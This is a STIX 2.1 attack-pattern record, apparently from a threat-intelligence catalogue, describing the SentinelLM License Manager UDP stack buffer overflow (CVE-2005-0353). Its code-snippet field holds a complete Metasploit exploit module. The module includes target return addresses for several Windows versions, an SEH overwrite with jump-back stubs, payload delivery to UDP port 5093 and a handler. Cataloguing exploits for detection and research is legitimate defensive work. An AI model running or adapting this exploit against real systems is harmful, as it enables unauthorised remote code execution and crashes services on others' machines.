{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--64134f5e-607b-4096-b926-048025452c74",
    "created": "2024-08-14T16:48:44.884687Z",
    "modified": "2024-08-14T16:48:44.884691Z",
    "name": "SentinelLM UDP Buffer Overflow",
    "description": " This module exploits a simple stack buffer overflow in the Sentinel License Manager. The SentinelLM service is installed with a wide selection of products and seems particular popular with academic products. If the wrong target value is selected the service will crash and not restart. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/license/sentinel_lm7_udp.rb",
            "external_id": "sentinel_lm7_udp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0353"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SentinelLM UDP Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a simple stack buffer overflow in the Sentinel\n        License Manager. The SentinelLM service is installed with a\n        wide selection of products and seems particular popular with\n        academic products. If the wrong target value is selected,\n        the service will crash and not restart.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0353'],\n          [ 'OSVDB', '14605'],\n          [ 'BID', '12742'],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 800,\n          'BadChars' => \"\\x00\\x20\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['SentinelLM 7.2.0.0 Windows NT 4.0 SP4/SP5/SP6', { 'Ret' => 0x77681799 }], # ws2help.dll\n          ['SentinelLM 7.2.0.0 Windows 2000 English',       { 'Ret' => 0x75022ac4 }], # ws2help.dll\n          ['SentinelLM 7.2.0.0 Windows 2000 German',        { 'Ret' => 0x74fa1887 }], # ws2help.dll\n          ['SentinelLM 7.2.0.0 Windows XP English SP0/SP1', { 'Ret' => 0x71aa32ad }], # ws2help.dll\n          ['SentinelLM 7.2.0.0 Windows 2003 English SP0',   { 'Ret' => 0x7ffc0638 }], # peb\n        ],\n      'DisclosureDate' => '2005-03-07' ))\n\n    register_options(\n      [\n        Opt::RPORT(5093)\n      ])\n  end\n\n  def check\n    connect_udp\n    udp_sock.put(\"\\x7a\\x00\\x00\\x00\\x00\\x00\")\n    res = udp_sock.recvfrom(8192)\n    disconnect_udp\n\n    if (res and res[0] == 0x7a)\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect_udp\n\n    # Payload goes first\n    buf = payload.encoded + rand_text_english(2048-payload.encoded.length)\n\n    # Return to a pop/pop/ret via SEH\n    buf[836, 4] = [target.ret].pack('V')\n\n    # The pop/pop/ret takes us here, jump back 5 bytes\n    buf[832, 2] = \"\\xeb\\xf9\"\n\n    # Now jump all the way back to our shellcode\n    buf[827, 5] = \"\\xe9\" + [-829].pack('V')\n\n    udp_sock.put(buf)\n    udp_sock.recvfrom(8192)\n\n    handler\n    disconnect_udp\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2005-03-07 ",
    "x_mitre_platforms": [
        "win'"
    ]
}